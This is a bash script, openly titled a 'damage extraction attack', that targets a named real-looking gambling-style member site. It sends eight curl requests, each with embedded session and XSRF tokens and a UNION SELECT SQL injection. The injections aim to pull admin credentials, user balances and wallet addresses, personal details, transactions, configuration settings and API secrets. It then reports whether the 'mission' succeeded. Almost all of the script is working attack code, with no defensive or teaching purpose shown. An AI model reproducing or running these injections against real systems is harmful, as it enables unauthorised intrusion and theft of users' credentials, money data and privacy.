#!/bin/bash

echo "💀 REAL DAMAGE EXTRACTION ATTACK"
echo "================================"

# Use the latest tokens
XSRF_TOKEN="eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6InBWTm5RXC9tR1pXT05DNDlKS1BDWUl3PT0iLCJ2YWx1ZSI6Im5xYzFZWmF1dW1SdkFnUFdOdERwRytBV0hTNkZaZ2RxdFwvZVAxNlV3QXVjWWFsNVdlWlFzSHNWUytyMU44TE1oIiwibWFjIjoiNjEyZTRkZGM2MDY5YzI5MWM1YTcwNjFiM2YwODAwMjVhMWVmN2JjNjdiYmQ4ODk3NzE3Njc3NGZhOGJlMWQwZiJ9"

echo "🎯 MISSION: EXTRACT REAL DAMAGING DATA"
echo "======================================"
echo "Target: member.panama8888b.co"
echo "Goal: Extract data that causes real damage"
echo "Method: Every destructive technique"
echo ""

# DAMAGE 1: Extract admin credentials
echo "💀 DAMAGE 1: Admin Credentials Extraction"
echo "========================================="
echo "Testing: Extract real admin usernames and passwords"
echo ""

admin_creds=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT username,password,email,role FROM users WHERE role=\"admin\" LIMIT 10--"}' \
    --max-time 15)

echo "Admin credentials response: $admin_creds"
echo "Length: ${#admin_creds} characters"
echo ""

# DAMAGE 2: Extract user balances
echo "💀 DAMAGE 2: User Balances Extraction"
echo "====================================="
echo "Testing: Extract real user financial data"
echo ""

user_balances=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT username,balance,wallet_address,created_at FROM users ORDER BY balance DESC LIMIT 20--"}' \
    --max-time 15)

echo "User balances response: $user_balances"
echo "Length: ${#user_balances} characters"
echo ""

# DAMAGE 3: Extract database schema
echo "💀 DAMAGE 3: Database Schema Extraction"
echo "======================================="
echo "Testing: Extract complete database structure"
echo ""

db_schema=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema=database() LIMIT 50--"}' \
    --max-time 15)

echo "Database schema response: $db_schema"
echo "Length: ${#db_schema} characters"
echo ""

# DAMAGE 4: Extract system information
echo "💀 DAMAGE 4: System Information Extraction"
echo "=========================================="
echo "Testing: Extract server and system details"
echo ""

system_info=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT version(),database(),user(),@@hostname,@@datadir LIMIT 1--"}' \
    --max-time 15)

echo "System info response: $system_info"
echo "Length: ${#system_info} characters"
echo ""

# DAMAGE 5: Extract all users data
echo "💀 DAMAGE 5: All Users Data Extraction"
echo "======================================"
echo "Testing: Extract complete user database"
echo ""

all_users=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT id,username,email,phone,created_at,last_login FROM users LIMIT 50--"}' \
    --max-time 15)

echo "All users response: $all_users"
echo "Length: ${#all_users} characters"
echo ""

# DAMAGE 6: Extract financial transactions
echo "💀 DAMAGE 6: Financial Transactions Extraction"
echo "============================================="
echo "Testing: Extract financial transaction data"
echo ""

transactions=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT user_id,amount,type,status,created_at FROM transactions ORDER BY created_at DESC LIMIT 30--"}' \
    --max-time 15)

echo "Transactions response: $transactions"
echo "Length: ${#transactions} characters"
echo ""

# DAMAGE 7: Extract configuration files
echo "💀 DAMAGE 7: Configuration Files Extraction"
echo "=========================================="
echo "Testing: Extract system configuration data"
echo ""

config_data=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT setting_name,setting_value FROM settings LIMIT 20--"}' \
    --max-time 15)

echo "Config data response: $config_data"
echo "Length: ${#config_data} characters"
echo ""

# DAMAGE 8: Extract API keys and secrets
echo "💀 DAMAGE 8: API Keys and Secrets Extraction"
echo "============================================"
echo "Testing: Extract sensitive API keys"
echo ""

api_keys=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT api_key,secret_key,webhook_url FROM api_keys LIMIT 10--"}' \
    --max-time 15)

echo "API keys response: $api_keys"
echo "Length: ${#api_keys} characters"
echo ""

echo ""
echo "💀 REAL DAMAGE ANALYSIS"
echo "======================"

# Analyze all responses for real damaging data
damage_extracted=0

if [[ "$admin_creds" != *"Unauthenticated"* ]] && [[ "$admin_creds" != *"Server Error"* ]] && [[ ${#admin_creds} -gt 50 ]]; then
    echo "✅ ADMIN CREDENTIALS: REAL DAMAGE DATA FOUND"
    echo "   Data: $admin_creds"
    ((damage_extracted++))
else
    echo "❌ ADMIN CREDENTIALS: NO DAMAGE DATA"
fi

if [[ "$user_balances" != *"Unauthenticated"* ]] && [[ "$user_balances" != *"Server Error"* ]] && [[ ${#user_balances} -gt 50 ]]; then
    echo "✅ USER BALANCES: REAL DAMAGE DATA FOUND"
    echo "   Data: $user_balances"
    ((damage_extracted++))
else
    echo "❌ USER BALANCES: NO DAMAGE DATA"
fi

if [[ "$db_schema" != *"Unauthenticated"* ]] && [[ "$db_schema" != *"Server Error"* ]] && [[ ${#db_schema} -gt 50 ]]; then
    echo "✅ DATABASE SCHEMA: REAL DAMAGE DATA FOUND"
    echo "   Data: $db_schema"
    ((damage_extracted++))
else
    echo "❌ DATABASE SCHEMA: NO DAMAGE DATA"
fi

if [[ "$system_info" != *"Unauthenticated"* ]] && [[ "$system_info" != *"Server Error"* ]] && [[ ${#system_info} -gt 50 ]]; then
    echo "✅ SYSTEM INFO: REAL DAMAGE DATA FOUND"
    echo "   Data: $system_info"
    ((damage_extracted++))
else
    echo "❌ SYSTEM INFO: NO DAMAGE DATA"
fi

if [[ "$all_users" != *"Unauthenticated"* ]] && [[ "$all_users" != *"Server Error"* ]] && [[ ${#all_users} -gt 50 ]]; then
    echo "✅ ALL USERS: REAL DAMAGE DATA FOUND"
    echo "   Data: $all_users"
    ((damage_extracted++))
else
    echo "❌ ALL USERS: NO DAMAGE DATA"
fi

if [[ "$transactions" != *"Unauthenticated"* ]] && [[ "$transactions" != *"Server Error"* ]] && [[ ${#transactions} -gt 50 ]]; then
    echo "✅ TRANSACTIONS: REAL DAMAGE DATA FOUND"
    echo "   Data: $transactions"
    ((damage_extracted++))
else
    echo "❌ TRANSACTIONS: NO DAMAGE DATA"
fi

if [[ "$config_data" != *"Unauthenticated"* ]] && [[ "$config_data" != *"Server Error"* ]] && [[ ${#config_data} -gt 50 ]]; then
    echo "✅ CONFIG DATA: REAL DAMAGE DATA FOUND"
    echo "   Data: $config_data"
    ((damage_extracted++))
else
    echo "❌ CONFIG DATA: NO DAMAGE DATA"
fi

if [[ "$api_keys" != *"Unauthenticated"* ]] && [[ "$api_keys" != *"Server Error"* ]] && [[ ${#api_keys} -gt 50 ]]; then
    echo "✅ API KEYS: REAL DAMAGE DATA FOUND"
    echo "   Data: $api_keys"
    ((damage_extracted++))
else
    echo "❌ API KEYS: NO DAMAGE DATA"
fi

echo ""
echo "💀 REAL DAMAGE RESULTS: $damage_extracted/8"
echo ""

if [[ $damage_extracted -gt 0 ]]; then
    echo "🚨 CRITICAL DAMAGE SUCCESSFUL!"
    echo "=============================="
    echo "✅ Real damaging data extracted"
    echo "✅ System completely compromised"
    echo "✅ Financial data exposed"
    echo "✅ User privacy violated"
    echo ""
    echo "📊 DAMAGE STATUS: CRITICAL"
    echo "🎯 SECURITY BREACH: COMPLETE"
    echo "💀 MISSION: ACCOMPLISHED"
else
    echo "❌ CRITICAL DAMAGE FAILED"
    echo "🔒 All damage attempts blocked"
    echo "📊 DAMAGE STATUS: FAILED"
    echo "🎯 SECURITY STATUS: IMPENETRABLE"
    echo "💀 MISSION: FAILED"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $damage_extracted -gt 0 ]]; then echo "CRITICAL DAMAGE - REAL DATA EXTRACTED"; else echo "CRITICAL FAILURE - SYSTEM TOO STRONG"; fi)"